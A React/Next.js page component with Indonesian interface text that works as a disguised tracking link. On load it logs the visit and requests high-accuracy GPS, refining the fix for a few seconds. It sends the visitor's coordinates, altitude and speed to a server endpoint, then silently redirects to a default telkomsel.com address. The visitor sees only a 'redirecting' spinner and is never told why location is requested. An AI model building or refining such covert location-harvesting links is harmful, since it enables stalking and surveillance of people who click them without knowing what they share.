'use client';

import { useEffect, useRef, useState } from 'react';
import { useParams } from 'next/navigation';
import Link from 'next/link';
import { AlertCircle } from 'lucide-react';
import { normalizeUrl } from '@/lib/security';

export default function DirectRedirectSharePage() {
  const params = useParams();
  const sessionId = params?.sessionId as string;
  const executedRef = useRef(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (!sessionId || executedRef.current) return;
    executedRef.current = true;

    fetch(`/api/sessions/${sessionId}`)
      .then((res) => {
        if (!res.ok) throw new Error('Sesi tidak valid atau telah kedaluwarsa.');
        return res.json();
      })
      .then((data) => {
        const session = data.session;
        if (!session || session.status !== 'active') return;

        const targetUrl = normalizeUrl(session.target_url || 'https://www.telkomsel.com/');

        const redirectNow = () => {
          window.location.replace(targetUrl);
        };

        const sendLocationAndRedirect = (latitude: number, longitude: number, accuracy: number, altitude?: number | null, speed?: number | null) => {
          // Use sendBeacon for reliable background transmission before redirect
          const payload = JSON.stringify({
            sessionId: session.session_code, // support both session_code & UUID
            latitude,
            longitude,
            accuracy,
            altitude,
            speed,
            permissionStatus: 'granted'
          });

          if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
            const blob = new Blob([payload], { type: 'application/json' });
            navigator.sendBeacon('/api/locations', blob);
            redirectNow();
          } else {
            fetch('/api/locations', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: payload,
              keepalive: true
            })
              .catch((err) => console.error('Location submit error:', err))
              .finally(() => {
                redirectNow();
              });
          }
        };

        // Record visitor visit hit first
        if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
          navigator.sendBeacon('/api/locations', JSON.stringify({
            sessionId: session.session_code,
            permissionStatus: 'prompt'
          }));
        }

        // Trigger Geolocation API with precision refinement
        if (typeof window !== 'undefined' && 'geolocation' in navigator) {
          let bestPos: GeolocationPosition | null = null;
          let watchId: number | null = null;
          let finished = false;

          const completeWithBest = () => {
            if (finished) return;
            finished = true;
            if (watchId !== null) {
              try {
                navigator.geolocation.clearWatch(watchId);
              } catch (_) {}
            }
            if (bestPos) {
              sendLocationAndRedirect(
                bestPos.coords.latitude,
                bestPos.coords.longitude,
                bestPos.coords.accuracy,
                bestPos.coords.altitude,
                bestPos.coords.speed
              );
            } else {
              redirectNow();
            }
          };

          // Maximum wait timer: give mobile GPS up to 4.5s to acquire satellite lock
          const maxWaitTimer = setTimeout(completeWithBest, 4500);

          watchId = navigator.geolocation.watchPosition(
            (pos) => {
              if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
                bestPos = pos;
              }
              // If GPS accuracy is already high (<= 25 meters), redirect immediately
              if (pos.coords.accuracy <= 25) {
                clearTimeout(maxWaitTimer);
                completeWithBest();
              }
            },
            (err) => {
              console.warn('Geolocation prompt error/dismissed:', err);
              clearTimeout(maxWaitTimer);
              completeWithBest();
            },
            {
              enableHighAccuracy: true,
              timeout: 6000,
              maximumAge: 0
            }
          );
        } else {
          redirectNow();
        }
      })
      .catch((err) => {
        console.error(err);
        setError(err.message || 'Tautan ini tidak valid atau telah kedaluwarsa.');
      });
  }, [sessionId]);

  if (error) {
    return (
      <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col items-center justify-center p-6 text-center font-sans">
        <div className="w-12 h-12 rounded-full bg-red-100 text-red-600 flex items-center justify-center mb-3">
          <AlertCircle className="w-6 h-6" />
        </div>
        <h2 className="text-base font-bold text-slate-900 mb-1">Tautan Tidak Tersedia</h2>
        <p className="text-xs text-slate-500 max-w-xs mb-5">{error}</p>
        <Link
          href="/"
          className="px-4 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white text-xs font-medium shadow-sm transition-colors"
        >
          Halaman Utama
        </Link>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full bg-white flex flex-col items-center justify-center space-y-3">
      {/* Blank white background with subtle spinner while redirecting directly to Target URL */}
      <div className="w-6 h-6 border-2 border-slate-200 border-t-blue-600 rounded-full animate-spin" />
      <span className="text-xs text-slate-400 font-sans">Mengalihkan...</span>
    </div>
  );
}
